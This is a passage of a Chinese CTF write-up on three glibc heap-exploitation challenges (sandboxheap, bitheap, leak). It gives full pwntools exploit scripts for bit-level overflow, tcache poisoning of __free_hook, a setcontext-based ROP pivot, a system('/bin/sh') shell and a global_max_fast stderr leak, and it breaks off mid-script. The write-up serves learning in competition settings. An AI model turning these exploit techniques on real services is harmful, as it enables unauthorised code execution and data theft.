alt="image-20221031101842345"></p><p>但是在最开始执行alarm系统调用(系统调用号为37)的时候，对0x202040这片内存进行了赋值为1的操作(如下)，也就是说正常的话，我们rax无论是多少，最终加上0x202040这个地址拿到的都是1，从而被拦截。</p><p><img src="../img/image-20221031102022071.png" alt="image-20221031102022071"></p><img src="../img/image-20221031102056360.png" alt="image-20221031102056360" style="zoom:50%;" /><p>但是我们发现程序里给了一些位置为0的机会，我们将给的这些地址都去减0x202040后，看一下对应的系统调用(如下)</p><p>如果我们想把open和read、write都位置都置成1，那就需要下面的两个if全部进入，而a1如果为3的话，就可以满足两个if的判断</p><img src="../img/image-20221031102922661.png" alt="image-20221031102922661" style="zoom:50%;" /><p>这个a1就是rdi，而想进入这个函数，需要rax为0x2710(如下)</p><img src="../img/image-20221031103414119.png" alt="image-20221031103414119" style="zoom:50%;" /><p>综上所述，如果我们想完成orw的话，需要在此之前设置rdi为3 rax为0x2710并执行一次syscall，才能自定义一个能够orw的白名单。</p><h3 id="漏洞所在：">漏洞所在：</h3><img src="../img/image-20221030114430759.png" alt="image-20221030114430759" style="zoom:50%;" /><p>在edit函数里，input函数(函数已重命名)的参数有个+1，所以判断这里是存在个溢出的。</p><p>然后input函数里面是这样的(如下)</p><img src="../img/image-20221030115609820.png" alt="image-20221030115609820" style="zoom:50%;" /><p>说实话这个我没太看懂，不过根据调试和师傅们的提示，感觉这里的大概意思就是说，我们输入的一个字节只取末尾一个比特，而八个字节就会取出来八个比特，这取出来的八个比特才表示出了一个字节。在以前我们想发送p64()打包后的数据，仅仅只需要发送八字节，但是在这题里，我们需要用64个字节来表示一个八字节的地址。</p><p>举个例子，我们原本要往内存里写一个地址为<code>0xdeadbeef</code>，以前的话，我们使用p64(0xdeadbeef)即可，但是这道题的话，我们使用下面的部分才能达到同样的效果</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>重新回到漏洞上面，这道题通过调试可以发现是溢出了一个比特，其实跟off by null的思路一样，都是去溢出然后篡改堆块的prev_inuse位，然后去打一个堆块合并。但是这道题还有一个难点就是有沙箱保护，通过分析沙箱规则，我们需要打一条rop链。因此对应的策略就是用setcontext来改变寄存器的值，从而将执行流劫持到rop链上</p><h3 id="利用思路：-v2">利用思路：</h3><p>由于我们需要打堆块合并，所以需要让合并的堆块释放掉能够进入unsorted bin，因此第一件事是先填满tcache bin。接着去打堆块合并,脚本如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#merge chunk   </span></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#堆块合并</span></span><br></pre></td></tr></table></figure><p>接下来去泄露堆地址和libc地址，大致思路就是做堆块重叠，让一块被释放掉的内存落在一个正在使用的堆块中，从而执行show函数完成泄露libc和堆地址。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xc0</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebe40</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">context_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x98</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">p.recvuntil(<span class="number">0x98</span>*<span class="string">&quot;\xff&quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后去打一个tcache poisoning,将free_hook申请出来，然后写入setcontext+53的地址，提前在堆块中布置好各个寄存器的值，最后去释放掉该堆块。即可控制各个寄存器，从而去执行系统调用read。将rop链读到执行流上，从而执行rop链(orw)读出flag。</p><h3 id="关于setcontext">关于setcontext</h3><p>由于是第一次利用这个setcontext，所以对setcontext做一点总结。</p><p>这个setcontext是libc库里的一个函数，汇编代码如下:</p><p><img src="../img/image-20221031111347679.png" alt="image-20221031111347679"></p><p>通过汇编代码发现，该函数主要是通过取rdi加上偏移的内存来对大部分寄存器进行了赋值，如果我们能够控制rdi，并且让rdi之后的一定内存都是可控的，就相当于我们可以控制大部分寄存器的值了。假设我们将free_hook劫持为setcontext+53的地址,因为free函数时rdi本身就是堆块的地址，所以rdi之后的内存我们也是可控的，这样下次执行free的时候，就可以控制大部分的寄存器了。需要注意的是，为了保证执行流不断，所以我们要控制rcx寄存器，在上面的汇编中有一个push rcx，而接下来最后是一个ret可以将执行流控制到rcx上，换句话说，最后setcontext执行完的rip由rcx决定。利用思路就是设置大部分寄存器，然后去打一个read的系统调用，将orw的rop链读到read函数要返回的地址上，完成orw。</p><h3 id="EXP：">EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;47.95.3.91:12243&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#merge chunk   </span></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#堆块合并</span></span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">bin</span>(<span class="number">0x67616c662f2e</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">10</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xc0</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebe40</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">context_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x98</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">p.recvuntil(<span class="number">0x98</span>*<span class="string">&quot;\xff&quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(<span class="number">0x101</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(free_hook)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#rsp heap_addr+0x640 0xa0</span></span><br><span class="line"><span class="comment">#rsi heap_addr+0x6b0 0x70</span></span><br><span class="line"><span class="comment">#rdi heap_addr+0x6a8 0x68</span></span><br><span class="line"><span class="comment">#rdx heap_addr+0x6c8 0x88</span></span><br><span class="line"><span class="comment">#rcx heap_addr+0x6e8 0xa8</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x0000000000130514</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000001b500</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">payload=(<span class="built_in">bin</span>(<span class="number">0x110020</span>+libc_base)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">12</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rdi</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(heap_addr+<span class="number">0x640</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rsi</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">3</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x800</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rdx</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">1</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(heap_addr+<span class="number">0x648</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rsp</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x110020</span>+libc_base)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">bin</span>(context_addr)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xED6</span>,<span class="number">0xEE2</span>,<span class="number">0xEEE</span>,<span class="number">0xEFA</span>,<span class="number">0xC9F</span>,<span class="number">0xBA7</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">orw+=p64(pop_rax_ret)+p64(<span class="number">0x2710</span>)</span><br><span class="line">orw+=p64(syscall)</span><br><span class="line">orw+=p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(libc_base + libc.symbols[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(heap_addr + <span class="number">0x7f0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_addr + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_addr + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">pause()</span><br><span class="line">p.send(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221030171048862.png" alt="image-20221030171048862"></p><h2 id="bitheap">bitheap</h2><p>这个题就是没加沙箱的sandboxheap，一模一样</p><p>而且比较巧的是，setcontext和分析沙箱规则都是比赛期间现学的，在打rop链之前，我专门去写了一个劫持free_hook写入system地址然后获取shell的脚本(没给这题开沙箱)，而且还当时专门保留了一份</p><p>思路同上题一样，不过最后写入的是system地址而非setcontext+53，脚本如下:</p><h3 id="EXP-v2">EXP:</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools-函数库 | ZIKH26’s Blog</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    </span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;47.95.3.91:23899&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#merge chunk   </span></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#堆块合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebe40</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(<span class="number">0x101</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(free_hook)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>)</span><br><span class="line">payload=<span class="built_in">bin</span>(<span class="number">0x68732f6e69622f</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x80</span>)</span><br><span class="line">payload=<span class="built_in">bin</span>(sys_addr)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xED6</span>,<span class="number">0xEE2</span>,<span class="number">0xEEE</span>,<span class="number">0xEFA</span>,<span class="number">0xC9F</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地获取shell的情况，同样打远程也ok(或者拿着sandboxheap的exp直接打也行)</p><img src="../img/image-20221031122947443.png" alt="image-20221031122947443" style="zoom:50%;" /><h2 id="leak">leak</h2><h3 id="保护策略：-v3">保护策略：</h3><img src="../img/image-20221031162148626.png" alt="image-20221031162148626" style="zoom:50%;" /><img src="../img/image-20221031162709412.png" alt="image-20221031162709412" style="zoom:50%;" /><p>emmm这个沙箱，感觉开了和没开一样。</p><h3 id="程序分析：">程序分析：</h3><p>在delete函数里存在UAF漏洞(如下)</p><img src="../img/image-20221031171824181.png" alt="image-20221031171824181" style="zoom:50%;" /><p>然后这道题没有show函数，而且没有puts等io输出函数，程序的所有输出都是自己用write函数来封装的，因此我们无法在这道题打IO leak泄露libc地址。</p><p>发现这道题其实已经将flag读到了一个堆块里(如下)</p><p><img src="../img/image-20221031172450922.png" alt="image-20221031172450922"></p><p>另外值得一提的就是在add函数里申请堆块的时候，最大可以申请到0x60000的堆块。</p><p><img src="../img/image-20221031172603962.png" alt="image-20221031172603962"></p><h3 id="利用思路：-v3">利用思路：</h3><p>因为这道题已经将flag读到堆块里了，所以我们应该考虑如何输出堆块里的数据。在exit退出的时候，会刷新IO_list_all链表上的所有文件流，而在刷新的时候_IO_2_1_stderr结构体中的_IO_write_base字段与_IO_write_ptr字段之间如果存在数据的话，就会将其输出出来，如果我们能让这两个字段之间包含了存flag的那个堆块，在程序退出的时候就可以打印出来flag了。</p><h4 id="篡改global-max-fast">篡改global_max_fast</h4><p>这样的话我们需要向stderr结构体里写入两个堆地址，于是思路是我们将global_max_fast改为一个大数，导致fastbinsY数组的溢出，计算好目标地址和fastbin数组之间的偏移，申请一个对应size的堆块，就可以让堆地址写入到目标地址了。</p><p>这里简单叙述下讲堆地址写入目标地址的原理:</p><blockquote><p>各类的bins的首地址都记录在了main_arena上，而fastbinY数组就是用来记录fastbin各个链的首地址。这个fastbinY数组定义的是10，所以理论上0xb0以内的堆块分到fastbbin中(但事实上fastbin正常情况最大的链为0x80)。而global_max_fast的作用表明了fastbin索引的阈值，如果我们能控制global_max_fast将其改为一个大数的话(假设改成0x1000)，再次释放掉一个0x500的堆块，那么该堆块就会进入fastbinY[0x4e]的位置(0x4e==(0x500-0x20)/0x10)，此时就会在fastbinY[0x4e]的地址留下一个堆地址。而fastbinY[0x4e]很明显是数组越界了，所以这个手法能在fastbinY数组的高地址去写入一个堆地址。</p></blockquote><p>这道题我们所需要的也就是在stderr结构体里写入两个堆地址，具体的size计算方法为</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fastbin_ptr = main_arena_addr + <span class="number">8</span> <span class="comment">#fastbinY数组的地址就是main_arena+8的位置</span></span><br><span class="line">index = (target_addr-fastbin_ptr)/<span class="number">8</span><span class="comment">#target_addr是我们希望将堆地址写入目标地址</span></span><br><span class="line">size = index*<span class="number">0x10</span> + <span class="number">0x20</span><span class="comment">#最后将其size大小的堆块释放掉，就可以让目标地址里写入一个堆地址(前提是global_max_fast要比index大)</span></span><br></pre></td></tr></table></figure><p>剩下的部分就较为简单了，我们只需要将global_max_fast和_IO_2_1_stderr申请出来，将前者改大，后者用于edit改写stderr的base字段的末尾(因为此处写入的堆地址并不是存储flag的那个堆块，所以需要最后用edit来修改一下该地址的低字节)。</p><h4 id="申请global-max-fast-stderr">申请global_max_fast&amp;&amp;stderr</h4><p>因为没有libc地址，所以我们需要借助unsorted bin的fd和bk指针main_arena+96再爆破下低字节从而做出来global_max_fast和stderr。此处操作的思路如下:</p><blockquote><p>add chunk1 0x80<br>add chunk2 0x80<br>add chunk3 0x80<br>add chunk4 0x410 #不考虑与top chunk合并<br>delete 1<br>delete 3<br>delete 2<br>delete 4</p><p>此时的bins情况为<br>tcache bin 0x90 :chunk2-&gt;chunk3-&gt;chunk1<br>unsorted bin:chunk4-&gt;main_arena+96</p><p>我们利用uaf+edit篡改chunk2的fd指针的低字节，将本来的chunk3改成chunk4<br>于是tcache bin 0x90:chunk2-&gt;chunk4-&gt;main_arena+96<br>再编辑chunk4，去修改main_arena+96的低字节，将其改为global_max_fast，最后即可申请出来global_max_fast</p></blockquote><p>而申请出来stderr的方法同上，我是将unsorted bin的fd改成了global_max_fast bk改为了stderr结构体(如下)</p><p><img src="../img/image-20221031183209848.png" alt="image-20221031183209848"></p><p><strong>注意:由于这样申请出来会破坏unsorted bin，所以在破坏之前，我们需要把之后用到的所有堆块先全部申请出来</strong></p><p>把上面两个地址申请出来后，最后释放掉size为0x14b0和0x14c0的两个堆块，即可将两个堆地址写入stderr结构体中(情况如下)</p><img src="../img/image-20221031183654159.png" alt="image-20221031183654159" style="zoom:50%;" /><p>因为之前我们将stderr结构体申请出来了，此时自然可以编辑它，将base字段的末尾改到装有flag的堆块低地址处，最后执行exit函数即可获取flag(不过最终脚本需要爆破，概率为1/256)</p><h3 id="EXP-v3">EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span 